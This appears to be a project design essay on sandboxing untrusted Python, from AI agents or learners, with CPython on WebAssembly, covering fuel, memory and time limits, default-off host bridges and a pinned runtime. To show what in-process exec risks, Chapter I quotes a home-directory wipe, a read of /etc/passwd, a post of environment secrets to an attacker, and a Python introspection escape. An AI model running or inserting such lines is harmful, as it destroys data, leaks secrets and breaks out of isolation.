# wasm-sandbox

---

# Running Code You Don't Trust

> How the gateway executes arbitrary Python from an AI agent — or a curious twelve-year-old — without ever putting the host at risk. A story about sandboxing, told through the one decision that makes the rest of it safe: a blast radius of zero, by construction.

There is a moment, in every system that lets something *else* write the code, where you have to answer an uncomfortable question. An agent has reasoned its way to a tool. The tool is not a fixed function you wrote and reviewed — it is Python, authored on the fly, by a model, against your database, in your process, on your machine. You are about to call `exec` on a string you have never seen.

**What happens if that string is hostile? What happens if it's just wrong?**

Most systems answer this question with a prayer and a code review. This one answers it with a wall.

---

## Chapter I — The Pain

### every easy way to run untrusted code is a way to lose your machine

Say you want to let a tool be *code* — not a rigid endpoint, but a few lines of Python that filter a result, reshape a document, call a sibling tool, hit an API. The flexibility is the entire point. It is also the entire problem, because the menu of ways to actually run that code is a menu of ways to get hurt.

**Run it in-process.** Fastest, simplest, catastrophic. `exec()` in your own interpreter hands the author your file system, your environment variables, your network, your secrets, and your database connection — all of it, ambiently, the instant the code runs. One `import os; os.system("rm -rf ~")`, one `open("/etc/passwd")`, one `requests.post(attacker, env=os.environ)` and the game is over. There is no boundary here. There is only trust, and you've extended it to a string.

**Sprinkle in a blocklist.** Strip `__builtins__`, ban `import`, regex out the scary words. This is security theater, and the people who break it do it for sport. Python's introspection is a hall of mirrors — `().__class__.__bases__[0].__subclasses__()` walks you back to anything you "removed," and every patched hole grows three more. A denylist is a promise that you've thought of every attack. You haven't.

**Reach for `os.fork` + `seccomp` + namespaces.** Now you're writing a container runtime by hand, per platform, and getting it subtly wrong in ways you'll discover in production. It doesn't run on a laptop the same as it runs on Linux. It leaks file descriptors. The syscall filter is either so tight nothing works or so loose nothing's protected.

**Spin up a real VM or container per call.** Correct, and far too heavy. Hundreds of milliseconds to seconds of cold start, a daemon to babysit, an image to maintain, an attack surface the size of an entire kernel. You'll do it for some workloads. You will not do it for a tool call that's supposed to feel instant.

Every one of these fails the same test. The default is *allow* — the code starts with access to everything, and you spend your effort frantically taking capabilities away, hoping you got them all. That is exactly backwards. And it's why the honest version of "let the agent run code" usually becomes "don't," and the flexibility dies in a review meeting.

The pain isn't that running untrusted code is hard. It's that the easy ways are unsafe and the safe ways are unusable.

---

## Chapter II — The Hypothesis

### what if the code started with nothing, and the blast radius were zero by construction?

Flip the polarity. Instead of a powerful runtime you frantically lock down, start from a runtime that can do *nothing at all* — and then hand back, one capability at a time, only the exact doors you choose to open.

State it as a wager:

> If untrusted code runs inside a memory-isolated machine that has **no syscalls, no file system, no network, no clock, no environment, and no host memory** unless a capability is explicitly granted, then a malicious author and a buggy author become the *same* problem — neither can reach anything you didn't hand them — and "safe" stops being a checklist you maintain and becomes a property of the boundary itself.

The shift is from **permissions** to **capabilities**. A permission system says "you may do X" and trusts the runtime to enforce it against code actively trying to lie about who it is. A capability system says "you physically do not hold a reference to X, so the question of permission never arises." You can't misuse a key you were never given. You can't escape a room with no doors.

This is not a new idea — it's the oldest good idea in security, *deny by default*, taken literally instead of aspirationally. The hypothesis is that a runtime exists which makes it cheap: starts in milliseconds, runs ordinary Python, isolates memory like a VM, and grants capabilities like a careful host instead of an all-or-nothing OS.

That runtime is WebAssembly.

---

## Chapter III — The Solution

### CPython, compiled to WebAssembly, run inside a jail that grants nothing it isn't told to

The gateway runs every code-backed tool as **CPython compiled to WebAssembly (WASI)**, executed inside the [`wasmtime`](https://wasmtime.dev) engine. The author writes normal Python. It runs in a real interpreter. But that interpreter lives inside a WebAssembly module, and a WebAssembly module is the rarest thing in computing: a program that genuinely begins with *nothing*.

A `.wasm` module has its own linear memory — a flat array of bytes it cannot grow past its limit and cannot point *outside of*. There is no instruction in WebAssembly to read host memory, call a syscall, open a socket, or touch a file. The only way a guest can affect the outside world is to call a function the host *imported into it by name*. Import nothing, and the guest is a pure, sealed calculator. That's the floor we build up from — not a powerful thing we cut down.

Here's the heart of it, the few lines where the jail is actually constructed. First the meters — a CPU budget, a memory ceiling, and a wall-clock deadline:

```688:691:services/sandbox_worker.py
    store = Store(engine)
    store.set_fuel(int(limits["fuel"]))
    store.set_limits(memory_size=int(limits["memory_bytes"]))
    store.set_epoch_deadline(1)
```

Then the capability set — which is almost entirely about what it leaves out:

```718:729:services/sandbox_worker.py
    wasi = WasiConfig()
    wasi.argv = [
        "python",
        "-c",
        _bootstrap_program(),
        "/job/job.json",
        "/job/sandbox.result.json",
    ]
    wasi.stdout_file = str(stdout_file)
    wasi.stderr_file = str(stderr_file)
    wasi.preopen_dir(str(job_dir), "/job")
    store.set_wasi(wasi)
```

Read what that `WasiConfig` does *not* say. It does not open the network — there is no socket capability, so `import socket` inside the guest reaches a dead end. It does not expose the host file system — the guest sees exactly one directory, the per-call scratch dir mapped to `/job`, and nothing above it; there is no `/`, no `/etc`, no home directory, no path traversal target because there is no parent to traverse to. It does not forward your environment — the author's `os.environ` is whatever the job explicitly placed there, never the host's secrets. The guest gets a clock and a temp directory. That's the whole world.

Everything else in this document is defense in depth layered *on top of* a runtime that was already incapable of hurting you.

---

## Chapter IV — The Layers

### fuel, epochs, memory, and the only three doors out

A sealed calculator that runs forever or eats all your RAM is still a denial-of-service. WebAssembly's gift is that compute and memory are *meterable* at the instruction level, so the limits are exact, not best-effort.

**Fuel — the CPU budget.** wasmtime can charge the guest one unit of "fuel" per WebAssembly instruction and trap the instant it runs dry. A `while True: pass` doesn't hang the host; it burns its allotment and dies with a clean `fuel_exhausted`. The default budget is generous enough for real work (`sandbox_fuel`, four billion instructions) and finite enough that infinite is impossible.

**Epochs — the wall clock.** Fuel bounds *work*; an epoch deadline bounds *time*. A background timer increments an epoch counter and the guest is interrupted when the wall deadline passes — so even code that blocks rather than spins still gets cut off. Crucially, the timer is **paused** while the host services a legitimate request on the guest's behalf, so waiting on a database round-trip is never charged as the author's compute time.

**Memory — the ceiling.** `store.set_limits(memory_size=...)` caps the guest's linear memory (`sandbox_memory_bytes`, 256 MiB by default). An allocation past the cap fails inside the guest as a normal `MemoryError`; it cannot reach out and pressure the host's memory, because it has no host memory to reach.

**Output — the bound on what comes back.** A guest can't flood you with a terabyte of result, either: stdout, stderr, and the returned value are each truncated to a hard budget (`sandbox_max_output_bytes`), and an oversized result is replaced with a small, fail-closed `output_limit` error rather than forcing the host to buffer an unbounded line.

And then the part that makes the sandbox *useful* instead of merely safe: **the doors.** A jail that can do nothing is secure and boring. The interesting question is how you grant exactly three powers — talk to the database, call a sibling tool, make an HTTP request — without surrendering the isolation that made the jail worth building.

The answer is that the guest never gets the capability. It gets a *request slip*. When tool code calls `context.db.users.find_one(...)` or `context.http.get(url)`, nothing happens inside the sandbox except a small JSON message written to a file in `/job/rpc`. The **host** — trusted code, outside the wall — picks up that message, and *it* decides:

- The **DB bridge** re-checks the caller's tenant and read/write scope on every single operation, caps documents and result bytes, and limits how many calls one invocation may make. The guest never holds a database connection; it holds the right to *ask* the host to run a bounded query.
- The **tool bridge** re-authorizes a cross-tool call against the *original* caller and runs the sibling in its own fresh sandbox, with a depth limit so a tool can't recurse the host to death.
- The **HTTP bridge** screens every URL against an egress allowlist and an SSRF denylist, pins a validated IP, bounds request and response size, and trips a circuit breaker on repeated failure. The author writes `context.http.get(...)`; the author never gets a raw socket.

All three bridges are **disabled by default** (`sandbox_db_bridge_enabled`, `sandbox_tool_bridge_enabled`, `sandbox_http_bridge_enabled` all start `False`). A fresh deployment runs code that can compute and return a value, and *nothing else*, until an operator deliberately opens a door — and even then, every door is a host-mediated, re-authorized, rate-limited request, not a handle.

Two more layers sit underneath, for the failures you didn't plan for:

**The supply chain is pinned.** The CPython runtime itself isn't whatever's lying around — it's a specific `python.wasm`, downloaded from a pinned URL and **rejected unless its SHA-256 matches** a hardcoded digest. You are not trusting a registry to still be honest tomorrow; you're trusting a hash.

```48:60:scripts/fetch_python_wasm.py
    expected = args.sha256.strip().lower()
    if len(expected) != 64:
        raise SystemExit("Expected a 64-char SHA256 digest for --sha256.")

    destination = Path(args.output)
    destination.parent.mkdir(parents=True, exist_ok=True)
    payload = _download(args.url)
    digest = _sha256_bytes(payload)
    if digest != expected:
        raise SystemExit(
            f"Checksum mismatch for downloaded python.wasm: expected {expected}, got {digest}."
        )
```

Third-party packages get the same deny-by-default treatment: pip installs run on the host *outside* the wasm jail, are restricted to a per-tenant allowlist (empty means **nothing**), and are wheels-only — `--only-binary=:all:` — so no package's `setup.py` ever executes arbitrary build code on your host. Any code a wheel does carry runs later, *inside* the sandbox, where it's already powerless.

**The worker is disposable, and starts clean every time.** Each call runs in a separate subprocess (the worker), inside a brand-new wasm `Store` and a fresh interpreter instance. The worker is launched with a scrubbed environment that contains import paths and locale and *not one caller secret*. If a job times out, crashes, or trips a protocol breach, the worker is killed and replaced — a poisoned worker can never serve the next caller. And as a last, belt-and-suspenders backstop beneath WebAssembly's own limits, the throwaway worker applies POSIX `rlimit` ceilings (CPU seconds, output file size, descriptor count) so that even a hypothetical escape from the wasm fuel/epoch limits still hits an operating-system wall.

Count the walls between hostile code and your machine: the WebAssembly memory boundary, the empty WASI capability set, the fuel meter, the epoch timer, the memory cap, the output bound, the default-off and host-re-authorized bridges, the checksum-pinned runtime, the allowlisted wheels-only installer, the secret-free disposable subprocess, and the OS-level rlimits under all of it. To do real harm, code would have to defeat *all* of them. To do nothing harmful, it just has to be ordinary Python — which is exactly what we wanted to run in the first place.

---

## Chapter V — The Playground

### a real database, real tools, real HTTP — and a delete key that can't reach your laptop

Now turn the whole thing around and look at it from the other side, because the same property that makes this safe for an *AI agent* makes it the best learning environment a beginner has ever had.

Think about how a kid or a junior developer actually learns to code today. The good stuff — touching a real database, calling a real API, watching a query you wrote return rows you didn't expect — lives behind a wall of fear. *Don't run that, you'll drop the table. Don't paste that, it might be malware. Don't experiment on prod. Set up a local environment first* — and three days later they're still fighting a Python version mismatch instead of learning anything. The toy sandboxes that are safe (a fake console, a frozen tutorial) aren't real, and the real systems aren't safe. Beginners are stuck choosing between consequence-free pretend and consequence-everywhere reality.

This sandbox dissolves that choice. It is **real on the inside and sealed on the outside**, which is precisely the environment you'd design for someone learning if you could.

A learner gets to write *actual* Python — real syntax, real exceptions, real tracebacks, the genuine article, not a watered-down classroom dialect. They get `context.db` and can run a real `find`, a real `aggregate`, a real `update_one`, and watch a real document come back. They get `context.http` and can call a weather API and parse a real JSON response. They get `context.tools` and can compose one tool out of another, which is *the* lesson most curricula never reach: software is made of other software.

And here is what they cannot do, no matter how hard they try, on purpose or by accident:

- They cannot `rm -rf` anything. There is no file system to delete.
- They cannot leak a secret or an API key. The environment the guest sees never contained them.
- They cannot melt the laptop with an infinite loop. Fuel runs out; the loop dies; the prompt comes back.
- They cannot drop the production table. Every database call is re-checked against *their* scope by the host, and a read-only learner is read-only no matter what they type.
- They cannot reach the internal network, scan a port, or get phished into pasting an exploit — the egress allowlist and SSRF denylist screen every outbound request, and there's no raw socket to abuse anyway.
- They cannot poison the next person's session. Their worker is thrown away and the next call starts from a clean interpreter.

That changes what experimentation *feels* like. The most valuable thing a beginner can do is the thing they're most afraid to do: **break things and read the error.** Run the query wrong. Hit the API the wrong way. Loop forever. Try the dangerous-looking thing just to see what happens. In this environment, the answer to "what happens?" is always a real, honest, educational result — a traceback, a timeout, a rejected scope, an `output_limit` — and *never* a destroyed machine, a leaked credential, or a 2 a.m. incident. The cost of curiosity drops to zero, and curiosity is the entire engine of learning to code.

It's the difference between learning to drive in a parking lot at midnight and learning to drive in traffic. One is real but unforgiving; the other is forgiving but fake. The sandbox is the third option nobody usually gets: **real traffic, in a car that physically cannot crash into anything that matters.** A junior dev can spend an afternoon making every mistake in the book against a live-feeling system and walk away having learned from all of them, with nothing downstream the worse for it.

The same wall that protects you from an adversarial AI is the wall that lets a fourteen-year-old run their first database query without anyone holding their breath.

---

## Chapter VI — Honest Limits

### what the wall is, and what it isn't

A security document that only lists strengths is marketing. So, plainly:

- **WebAssembly isolates the guest; it is not a substitute for the layers around it.** A bug in wasmtime, or in the bridge code that the host runs on the guest's behalf, is outside the guest's wall. That's exactly why the bridges re-authorize on the *host* and why the OS-level rlimits and disposable workers exist underneath — defense in depth assumes any single layer can fail.
- **Side channels are not the threat model.** This sandbox stops a guest from reading host memory, files, secrets, and the network. It does not promise constant-time defense against exotic timing or microarchitectural side channels; if that's your threat model, a guest sharing a host is the wrong starting point.
- **A granted door is a granted door.** If an operator enables the HTTP bridge and allowlists a host, code can reach that host within the configured bounds. The bridges shrink and police capability; they don't make a *granted* capability harmless. Grant deliberately.
- **The runtime is a moving dependency.** The safety rests on the pinned `python.wasm` and on wasmtime; both must be kept current as fixes land. A pin is a promise that the artifact is the one you vetted — it is not a promise that the artifact is eternally flawless.

None of this weakens the core claim. It sharpens it. The wall is strong precisely because it does not pretend to be the only wall.

---

## The Thread

Untrusted code is unsafe because the usual runtimes start by granting everything and ask you to take it back. WebAssembly starts by granting nothing and asks you to hand back exactly the doors you choose. CPython compiled into that model gives you a real interpreter inside a sealed machine; fuel and epochs and a memory cap make "forever" and "all of it" impossible; host-mediated bridges turn three dangerous capabilities into three re-authorized requests; a checksum-pinned runtime and an allowlisted, wheels-only installer and a secret-free disposable worker close the supply chain and the blast radius behind it.

The result is one property, stated two ways. For the machine handing code to an AI: *a hostile string and a buggy string are the same harmless problem.* For the human learning to write that string: *every mistake is real enough to teach you and contained enough to forgive you.*

A blast radius of zero, by construction — which is the only kind worth trusting, and the only kind safe enough to hand a beginner the keys.
